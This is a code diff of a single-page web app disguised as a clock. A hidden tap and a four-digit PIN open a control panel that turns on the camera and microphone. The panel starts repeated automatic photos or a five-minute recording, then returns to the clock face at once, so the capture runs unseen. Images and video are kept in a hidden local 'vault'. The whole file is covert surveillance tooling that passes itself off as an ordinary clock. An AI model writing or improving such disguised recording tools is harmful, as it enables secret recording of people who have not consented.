@@ -3,38 +3,34 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Roman Studio Clock</title>
+    <title>Roman Studio System</title>
     <style>
         body { font-family: sans-serif; background: #000; color: white; margin: 0; overflow: hidden; display: flex; justify-content: center; align-items: center; height: 100vh; }
-        
-        /* گھڑی اسکرین */
         #clock-screen { display: flex; flex-direction: column; align-items: center; justify-content: center; width: 100%; height: 100%; cursor: pointer; position: fixed; top:0; left:0; z-index: 999; background: #000; }
-        .clock { width: 250px; height: 250px; border: 8px solid #1a1a1a; border-radius: 50%; position: relative; background: #050505; box-shadow: 0 0 20px rgba(52,152,219,0.2); }
+        .clock { width: 250px; height: 250px; border: 8px solid #1a1a1a; border-radius: 50%; position: relative; background: #050505; }
         .hand { position: absolute; bottom: 50%; left: 50%; transform-origin: bottom; border-radius: 10px; }
         .hour { width: 6px; height: 50px; background: white; z-index: 3; }
         .minute { width: 4px; height: 80px; background: #888; z-index: 2; }
         .second { width: 2px; height: 95px; background: #e74c3c; z-index: 1; }
-        .roman-text { margin-top: 30px; font-size: 22px; color: #3498db; animation: blink 2s infinite; font-weight: bold; letter-spacing: 1px; }
+        .roman-text { margin-top: 30px; font-size: 22px; color: #3498db; animation: blink 2s infinite; font-weight: bold; }
         @keyframes blink { 0%, 100% { opacity: 0.4; } 50% { opacity: 1; } }
 
-        /* پن اسکرین */
         #pin-screen { display: none; text-align: center; width: 100%; height: 100vh; background: #000; position: fixed; top:0; z-index: 1000; padding-top: 25vh; }
         input { padding: 15px; font-size: 28px; width: 140px; text-align: center; background: #111; color: white; border: 1px solid #333; border-radius: 12px; outline: none; }
 
-        /* کنٹرول پینل */
         #admin-panel { display: none; padding: 20px; width: 100%; height: 100vh; overflow-y: auto; background: #000; position: fixed; top: 0; z-index: 998; box-sizing: border-box; }
         video { width: 100%; max-width: 320px; border-radius: 15px; background: #111; margin: 0 auto 15px; display: block; border: 2px solid #222; }
-        .btn { width: 100%; max-width: 320px; padding: 15px; margin: 8px auto; border: none; border-radius: 12px; font-weight: bold; cursor: pointer; color: white; font-size: 14px; display: block; text-transform: uppercase; }
+        .btn { width: 100%; max-width: 320px; padding: 15px; margin: 8px auto; border: none; border-radius: 12px; font-weight: bold; cursor: pointer; color: white; display: block; text-transform: uppercase; }
         .btn-blue { background: #3498db; }
         .btn-green { background: #2ecc71; }
         .btn-orange { background: #f39c12; }
         .btn-red { background: #e74c3c; }
-        .btn-grey { background: #555; }
+        .sub-menu { display: none; background: #111; padding: 10px; border-radius: 12px; margin-bottom: 10px; border: 1px solid #333; }
 
-        /* گیلری */
         .gallery { display: grid; grid-template-columns: 1fr 1fr; gap: 12px; margin-top: 25px; padding-bottom: 50px; }
         .card { background: #111; padding: 8px; border-radius: 12px; border: 1px solid #222; text-align: center; }
         .card img, .card video { width: 100%; border-radius: 8px; margin-bottom: 5px; }
+        .del-btn { background: #e74c3c; color: white; border: none; padding: 8px; border-radius: 6px; cursor: pointer; width: 100%; font-size: 12px; }
     </style>
 </head>
 <body>
@@ -49,28 +45,29 @@
     </div>
 
     <div id="pin-screen">
-        <h3 style="color:#3498db; margin-bottom:20px;">Enter Private PIN</h3>
+        <h3>System Access</h3>
         <input type="password" id="pinIn" maxlength="4" oninput="checkPin(this.value)" placeholder="****">
-        <p onclick="location.reload()" style="color:#666; margin-top:40px; cursor:pointer;">Back to Clock</p>
+        <p onclick="goBackToClock()" style="color:#666; margin-top:40px; cursor:pointer;">Back</p>
     </div>
 
     <div id="admin-panel">
-        <h3 style="text-align:center; color:#3498db; margin-bottom:20px;">Roman Studio Security</h3>
+        <h3 style="text-align:center; color:#3498db;">System Control</h3>
         <video id="preview" autoplay playsinline muted></video>
         <canvas id="canvas" style="display:none;"></canvas>
 
-        <button class="btn btn-blue" onclick="startCam('user')">Front Camera On</button>
-        <button class="btn btn-blue" onclick="startCam('environment')">Back Camera On</button>
-        <button class="btn btn-green" onclick="goHidden('photo')">Start Auto Photo (30s)</button>
-        <button class="btn btn-orange" id="vidBtn" onclick="goHidden('video')">Start 5 Min Video</button>
-        <button class="btn btn-red" id="stopBtn" style="display:none;" onclick="stopRecordingManually()">Stop Recording Now</button>
-        
-        <div style="margin-top:20px; border-top: 1px solid #333; padding-top:10px;">
-            <button class="btn btn-grey" onclick="downloadAll()">Download All Data</button>
-            <button class="btn btn-red" onclick="clearAll()">Clear All Vault</button>
+        <button class="btn btn-blue" onclick="toggleSub('front-menu')">Front Cam Options</button>
+        <div id="front-menu" class="sub-menu">
+            <button class="btn btn-green" onclick="quickAction('user', 'photo')">Auto Photo (20 Snaps)</button>
+            <button class="btn btn-orange" onclick="quickAction('user', 'video')">Record 5 Min Video</button>
         </div>
-        <button class="btn btn-red" style="margin-top:20px;" onclick="location.reload()">Lock & Exit</button>
+
+        <button class="btn btn-blue" onclick="toggleSub('back-menu')">Back Cam Options</button>
+        <div id="back-menu" class="sub-menu">
+            <button class="btn btn-green" onclick="quickAction('environment', 'photo')">Auto Photo (20 Snaps)</button>
+            <button class="btn btn-orange" onclick="quickAction('environment', 'video')">Record 5 Min Video</button>
+        </div>
         
+        <button class="btn btn-red" onclick="location.reload()">Lock System</button>
         <div id="gallery" class="gallery"></div>
     </div>
 
@@ -82,12 +79,12 @@
             document.getElementById('hour').style.transform = `translateX(-50%) rotate(${(now.getHours()%12)*30 + now.getMinutes()/2}deg)`;
         }
         setInterval(runClock, 1000);
-        runClock();
 
-        function openPin() { 
-            document.getElementById('pin-screen').style.display='block'; 
-            document.getElementById('pinIn').value = '';
-            document.getElementById('pinIn').focus();
+        function openPin() { document.getElementById('pin-screen').style.display='block'; }
+        function goBackToClock() {
+            document.getElementById('pin-screen').style.display='none';
+            document.getElementById('admin-panel').style.display='none';
+            document.getElementById('clock-screen').style.display='flex';
         }
         
         function checkPin(v) { 
@@ -99,63 +96,34 @@
             } 
         }
 
-        let stream, rec, chunks = [], pInterval, vTimer;
+        function toggleSub(id) {
+            let el = document.getElementById(id);
+            el.style.display = (el.style.display === 'block') ? 'none' : 'block';
+        }
 
-        async function startCam(m) {
+        let stream, rec, chunks = [], photoInterval, photoCount = 0, vTimer;
+
+        async function quickAction(camType, mode) {
             if(stream) stream.getTracks().forEach(t => t.stop());
             try {
-                stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: m, width: 480 }, audio: true });
+                stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: camType }, audio: true });
                 document.getElementById('preview').srcObject = stream;
-                alert("Camera & Mic Activated!");
-            } catch(e) { alert("Camera Error: " + e.message); }
+                setTimeout(() => {
+                    if(mode === 'photo') startAutoPhoto();
+                    else startVideoRecording();
+                    goBackToClock();
+                }, 500);
+            } catch(e) { alert("Error: " + e.message); }
         }
 
-        function goHidden(mode) {
-            if(!stream) { alert("Please turn on Camera first!"); return; }
-            
-            if(mode === 'photo') {
-                takeSnap();
-                if(pInterval) clearInterval(pInterval);
-                pInterval = setInterval(takeSnap, 30000);
-            } else {
-                startVideoRecording();
-            }
-            
-            // فوراً کلاک سکرین پر جائیں
-            document.getElementById('admin-panel').style.display='none';
-            document.getElementById('clock-screen').style.display='flex';
-        }
-
-        function startVideoRecording() {
-            chunks = [];
-            rec = new MediaRecorder(stream);
-            rec.ondataavailable = e => { if(e.data.size > 0) chunks.push(e.data); };
-            
-            rec.onstop = () => { 
-                saveVid(); 
-                alert("Video Saved to Roman Studio Vault!");
-            };
-
-            rec.start();
-            document.getElementById('vidBtn').style.display = 'none';
-            document.getElementById('stopBtn').style.display = 'block';
-
-            // 5 منٹ (300,000 ملی سیکنڈ) کے بعد خودکار بند ہونا
-            vTimer = setTimeout(() => {
-                if(rec && rec.state === "recording") {
-                    rec.stop();
-                    location.reload(); // سیو کرنے کے بعد ری فریش
-                }
-            }, 300000); 
-        }
-
-        function stopRecordingManually() {
-            if(rec && rec.state === "recording") {
-                clearTimeout(vTimer);
-                rec.stop();
-                document.getElementById('stopBtn').style.display = 'none';
-                document.getElementById('vidBtn').style.display = 'block';
-            }
+        function startAutoPhoto() {
+            photoCount = 0;
+            if(photoInterval) clearInterval(photoInterval);
+            takeSnap(); photoCount++;
+            photoInterval = setInterval(() => {
+                if(photoCount < 20) { takeSnap(); photoCount++; }
+                else clearInterval(photoInterval);
+            }, 30000);
         }
 
         function takeSnap() {
@@ -167,47 +135,42 @@
             saveData('img', c.toDataURL('image/jpeg', 0.5));
         }
 
-        function saveVid() {
-            if(chunks.length === 0) return;
-            const b = new Blob(chunks, { type: 'video/webm' });
-            const r = new FileReader();
-            r.readAsDataURL(b);
-            r.onloadend = () => { saveData('vid', r.result); updateGallery(); };
+        function startVideoRecording() {
+            chunks = [];
+            rec = new MediaRecorder(stream);
+            rec.ondataavailable = e => chunks.push(e.data);
+            rec.onstop = () => {
+                const blob = new Blob(chunks, { type: 'video/webm' });
+                const reader = new FileReader();
+                reader.readAsDataURL(blob);
+                reader.onloadend = () => saveData('vid', reader.result);
+            };
+            rec.start();
+            // 5 منٹ بعد آٹو سٹاپ
+            if(vTimer) clearTimeout(vTimer);
+            vTimer = setTimeout(() => { if(rec.state === "recording") rec.stop(); }, 300000);
         }
 
-        function saveData(t, d) {
+        function saveData(type, data) {
             let s = JSON.parse(localStorage.getItem('rvault') || '[]');
-            s.push({ t: t, d: d, time: new Date().toLocaleString('en-US', { hour12: true }) });
+            s.push({ t: type, d: data, time: new Date().toLocaleString() });
             localStorage.setItem('rvault', JSON.stringify(s));
         }
 
         function updateGallery() {
             const s = JSON.parse(localStorage.getItem('rvault') || '[]');
             const g = document.getElementById('gallery');
-            g.innerHTML = '<h3 style="grid-column: 1 / span 2; border-top:1px solid #333; padding-top:20px;">Vault Data</h3>';
+            g.innerHTML = '';
             s.slice().reverse().forEach((i, idx) => {
-                let html = i.t === 'img' ? `<img src="${i.d}">` : `<video src="${i.d}" controls></video>`;
-                g.innerHTML += `<div class="card">${html}<p style="font-size:10px; color:#3498db">${i.time}</p><button onclick="delItem(${s.length - 1 - idx})" style="background:red; border:none; color:white; width:100%; border-radius:6px; padding:5px;">Del</button></div>`;
+                let actualIdx = s.length - 1 - idx;
+                let media = i.t === 'img' ? `<img src="${i.d}">` : `<video src="${i.d}" controls></video>`;
+                g.innerHTML += `<div class="card">${media}<p style="font-size:10px">${i.time}</p><button class="del-btn" onclick="del(${actualIdx})">Delete</button></div>`;
             });
         }
 
-        function delItem(idx) {
+        function del(idx) {
             let s = JSON.parse(localStorage.getItem('rvault') || '[]');
-            s.splice(idx, 1);
-            localStorage.setItem('rvault', JSON.stringify(s));
-            updateGallery();
-        }
-
-        function clearAll() { if(confirm("Clear everything?")) { localStorage.removeItem('rvault'); updateGallery(); } }
-
-        function downloadAll() {
-            const s = JSON.parse(localStorage.getItem('rvault') || '[]');
-            s.forEach((item, index) => {
-                const link = document.createElement('a');
-                link.href = item.d;
-                link.download = `Roman_${index}.${item.t === 'img' ? 'jpg' : 'webm'}`;
-                link.click();
-            });
+            if(confirm("Delete this?")) { s.splice(idx, 1); localStorage.setItem('rvault', JSON.stringify(s)); updateGallery(); }
         }
     </script>
 </body>
